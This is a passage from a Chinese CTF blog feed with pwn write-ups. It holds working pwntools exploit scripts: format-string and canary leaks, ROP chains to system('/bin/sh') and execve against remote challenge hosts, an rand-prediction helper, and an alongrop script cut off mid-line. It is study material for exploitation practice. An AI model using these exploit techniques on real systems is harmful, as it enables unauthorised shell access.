class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">mode=<span class="number">1</span></span><br><span class="line">url=<span class="string">&#x27;43.139.51.42&#x27;</span></span><br><span class="line">port=<span class="number">9999</span></span><br><span class="line">libc=ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"><span class="comment">#exp=cdll.LoadLibraary(&quot;./libc.so.6&quot;)</span></span><br><span class="line">exe=process(<span class="string">&quot;./rand&quot;</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment"># 提前10s 拿到随机数 注意这里结尾有换行符</span></span><br><span class="line">rand=exe.recvline()[<span class="number">5</span>:]</span><br><span class="line">offset=<span class="number">0x18</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choice</span>(<span class="params">op,io</span>):</span><br><span class="line">io.recvuntil(<span class="string">&quot;You choice: \n&quot;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(op))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak_stack_pie</span>(<span class="params">io</span>):</span><br><span class="line"><span class="comment">#leak-stack &amp; canary</span></span><br><span class="line">choice(<span class="number">2</span>,io)</span><br><span class="line">payload=<span class="string">b&#x27;%9$p%8$p&#x27;</span>.ljust(<span class="number">8</span>,<span class="string">b&quot;\x41&quot;</span>)</span><br><span class="line">io.sendafter(<span class="string">&quot;What b00k do you want??\n&quot;</span>,payload)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">base=<span class="built_in">int</span>(io.recv(<span class="number">14</span>),<span class="number">16</span>)-<span class="number">0x1989</span>-<span class="number">196</span></span><br><span class="line">stack=<span class="built_in">int</span>(io.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(base))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(stack))</span><br><span class="line">log.success(<span class="string">&quot;base-&#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(base)))</span><br><span class="line"><span class="keyword">return</span> base,stack</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak_canary</span>(<span class="params">io</span>):</span><br><span class="line">choice(<span class="number">1</span>,io)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+<span class="string">b&#x27;b&#x27;</span></span><br><span class="line">io.sendafter(<span class="string">&quot;What b0ok do you want??\n&quot;</span>,payload)</span><br><span class="line">io.recvuntil(<span class="string">&quot;ab&quot;</span>)</span><br><span class="line">canary=u64(io.recv(<span class="number">7</span>).rjust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(canary))</span><br><span class="line">io.sendafter(<span class="string">&quot;Confirm again\n&quot;</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x19</span>)</span><br><span class="line"><span class="keyword">return</span> canary</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>(<span class="params">mode</span>):</span><br><span class="line"><span class="keyword">if</span> mode==<span class="number">0</span> :</span><br><span class="line">io=process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">io=remote(url,port)</span><br><span class="line"></span><br><span class="line">canary=leak_canary(io)</span><br><span class="line">base,stack=leak_stack_pie(io)</span><br><span class="line"><span class="comment"># got&amp;plt</span></span><br><span class="line">puts_got=elf.got[<span class="string">&quot;puts&quot;</span>]+base</span><br><span class="line">puts_plt=elf.plt[<span class="string">&quot;puts&quot;</span>]+base</span><br><span class="line"><span class="comment"># gadget</span></span><br><span class="line">pop_rdi=<span class="number">0x13F6</span>+base</span><br><span class="line">ret=<span class="number">0x13F7</span>+base</span><br><span class="line">read=<span class="number">0x1878</span>+base</span><br><span class="line"><span class="comment"># leak-libc</span></span><br><span class="line">choice(<span class="number">3</span>,io)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">rand</span><br><span class="line">io.sendafter(<span class="string">&quot;Let&#x27;s get started\n&quot;</span>,rand)</span><br><span class="line">payload=offset*<span class="string">b&#x27;a&#x27;</span>+p64(canary)</span><br><span class="line">payload+=p64(elf.bss()+base+<span class="number">0x800</span>)+p64(pop_rdi)</span><br><span class="line">payload+=p64(puts_got)+p64(puts_plt)+p64(read)</span><br><span class="line"><span class="comment">#io.recvuntil(&quot;OK! You are right!!!\n&quot;)</span></span><br><span class="line"><span class="comment">#gdb.attach(io,&quot;b *bo0k_store&quot;)</span></span><br><span class="line">io.sendafter(<span class="string">&quot;What bo0k do you want??\n&quot;</span>,payload)</span><br><span class="line">io.recvuntil(<span class="string">&quot;This book is for you\n&quot;</span>)</span><br><span class="line">puts=u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts))</span><br><span class="line">libcbase=puts-libc.sym[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line"><span class="comment">#log.success(&quot;libc-&#123;&#125;&quot;.format(hex(libc)))</span></span><br><span class="line">system=libcbase+libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">bin_sh=libcbase+<span class="number">0x1d8678</span></span><br><span class="line"><span class="comment">#rop </span></span><br><span class="line">payload=<span class="number">0x18</span>*<span class="string">b&#x27;a&#x27;</span>+p64(canary)+p64(canary)+p64(pop_rdi)</span><br><span class="line">payload+=p64(bin_sh)+p64(ret)+p64(system)</span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>):</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">pwn(mode)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;again!&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="rand-源码"><a href="#rand-源码" class="headerlink" title="rand 源码"></a>rand 源码</h2><p><strong>gcc 编译之后才能运行哦</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">srand(time(<span class="number">0</span>)+<span class="number">10</span>);</span><br><span class="line"><span class="type">int</span> random=rand()%<span class="number">1131796</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;rand:%d\n&quot;</span>,random);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 比赛记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> 随机时间 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HXCTF-2025-pwn</title>
      <link href="/2025/10/06/ctf%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/HXCTF%E5%86%B3%E8%B5%9B/writeup/"/>
      <url>/2025/10/06/ctf%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/HXCTF%E5%86%B3%E8%B5%9B/writeup/</url>
      
        <content type="html"><![CDATA[<h1 id="final"><a href="#final" class="headerlink" title="final"></a>final</h1><h2 id="alongrop"><a href="#alongrop" class="headerlink" title="alongrop"></a>alongrop</h2><h3 id="ida分析"><a href="#ida分析" class="headerlink" title="ida分析"></a>ida分析</h3><p><img src="https://gitee.com/jiang-xunpan/my_pic/raw/master/img/image-20250524195608074.png" alt="image-20250524195608074"><br>1.打开第一眼，左边函数特多，加载特慢。静态编译的文件<br>2.如图框出部分，提示ROPchain。同时0x256字节的输入，显然是ROP。<br>3.最后，标记出偏移是0x40+0x8</p><h3 id="gdb-ROPgadget-分析"><a href="#gdb-ROPgadget-分析" class="headerlink" title="gdb &amp; ROPgadget 分析"></a>gdb &amp; ROPgadget 分析</h3><p><code>ROPgadget --binary alongrop --ropchain</code><br><strong>使用命令查看一下ropchain</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line">- Step <span class="number">5</span> -- Build the ROP chain</span><br><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># execve generated by ROPgadget</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"></span><br><span class="line"><span class="comment"># Padding goes here</span></span><br><span class="line">p = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000404ed2</span>) <span class="comment"># pop rsi ; pop rbp ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004aa0c0</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x4141414141414141</span>) <span class="comment"># padding</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004211eb</span>) <span class="comment"># pop rax ; ret</span></span><br><span class="line">p += <span class="string">b&#x27;/bin//sh&#x27;</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004205c5</span>) <span class="comment"># mov qword ptr [rsi], rax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000404ed2</span>) <span class="comment"># pop rsi ; pop rbp ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004aa0c8</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x4141414141414141</span>) <span class="comment"># padding</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000044cf30</span>) <span class="comment"># xor rax, rax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004205c5</span>) <span class="comment"># mov qword ptr [rsi], rax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000402148</span>) <span class="comment"># pop rdi ; pop rbp ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004aa0c0</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x4141414141414141</span>) <span class="comment"># padding</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000404ed2</span>) <span class="comment"># pop rsi ; pop rbp ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004aa0c8</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x4141414141414141</span>) <span class="comment"># padding</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000040190d</span>) <span class="comment"># pop rdx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004aa0c8</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000044cf30</span>) <span class="comment"># xor rax, rax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000046a060</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000046a060</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000046a060</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000046a060</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000046a060</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000046a060</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000046a060</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000046a060</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000046a060</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000046a060</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000046a060</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000046a060</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000046a060</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000046a060</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000046a060</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000046a060</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000046a060</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000046a060</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000046a060</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000046a060</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000046a060</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000046a060</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000046a060</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000046a060</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000046a060</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000046a060</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000046a060</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000046a060</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000046a060</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000046a060</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000046a060</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000046a060</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000046a060</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000046a060</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000046a060</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000046a060</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000046a060</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000046a060</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000046a060</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000046a060</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000046a060</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000046a060</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000046a060</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000046a060</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000046a060</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000046a060</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000046a060</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000046a060</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000046a060</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000046a060</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000046a060</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000046a060</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000046a060</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000046a060</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000046a060</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000046a060</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000046a060</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000046a060</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000046a060</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004012d3</span>) <span class="comment"># syscall</span></span><br></pre></td></tr></table></figure><p>1.有可以直接写的ROPchain，但是应该不行，因为太长了。我们可以搜寻一下pop_rax;ret,直接将rax设置为0x3b，这样可以减少很多字节。<br>2.然后不要忘记输入ROPchain前有0x40+0x8的垃圾数据要填充。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"></span><br><span class="line">mode=<span class="number">1</span></span><br><span class="line">url=<span class="string">&#x27;43.139.51.42&#x27;</span></span><br><span class="line">port=<span class="number">38369</span></span><br><span class="line"><span class="keyword">if</span> mode==<span class="number">0</span> :</span><br><span class="line">io=process(<span class="string">&quot;./alongrop&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">io=remote(url,port)</span><br><span class="line"><span class="comment">#gadgets</span></span><br><span class="line">pop_rax=<span class="number">0x00000000004211eb</span></span><br><span class="line">pop_rbx=<span class="number">0x000000000040190d</span></span><br><span class="line">pop_rsi_rbp=<span class="number">0x0000000000404ed2</span></span><br><span class="line">pop_rdi_rbp=<span class="number">0x0000000000402148</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line">offset=<span class="number">0x40</span>+<span class="number">0x8</span></span><br><span class="line">payload=offset*<span class="string">b&quot;a&quot;</span></span><br><span class="line">payload+=p64(<span class="number">0x0000000000404ed2</span>)</span><br><span class="line">payload+=p64(<span class="number">0x00000000004aa0c0</span>)</span><br><span class="line">payload+=p64(<span class="number">0x4141414141414141</span>)</span><br><span class="line">payload+=p64(<span class="number">0x00000000004211eb</span>)</span><br><span class="line">payload+=<span class="string">b&#x27;/bin//sh&#x27;</span></span><br><span class="line">payload+=p64(<span class="number">0x00000000004205c5</span>)</span><br><span class="line">payload+=p64(<span class="number">0x0000000000404ed2</span>)</span><br><span class="line">payload+=p64(<span class="number">0x00000000004aa0c8</span>)</span><br><span class="line">payload+=p64(<span class="number">0x4141414141414141</span>)</span><br><span class="line">payload+=p64(<span class="number">0x000000000044cf30</span>)</span><br><span class="line">payload+=p64(<span class="number">0x00000000004205c5</span>)</span><br><span class="line">payload+=p64(<span class="number">0x0000000000402148</span>)</span><br><span class="line">payload+=p64(<span class="number">0x00000000004aa0c0</span>)</span><br><span class="line">payload+=p64(<span class="number">0x4141414141414141</span>)</span><br><span class="line">payload+=p64(<span class="number">0x0000000000404ed2</span>) <span class="comment"># pop rsi ; pop rbp ; ret</span></span><br><span class="line">payload+=p64(<span class="number">0x00000000004aa0c8</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">payload+=p64(<span class="number">0x4141414141414141</span>) <span class="comment"># padding</span></span><br><span class="line">payload+=p64(<span class="number">0x000000000040190d</span>) <span class="comment"># pop rdx ; ret</span></span><br><span class="line">payload+=p64(<span class="number">0x00000000004aa0c8</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">payload+=p64(<span class="number">0x00000000004211eb</span>)</span><br><span class="line">payload+=p64(<span class="number">59</span>)</span><br><span class="line">payload+=p64(<span 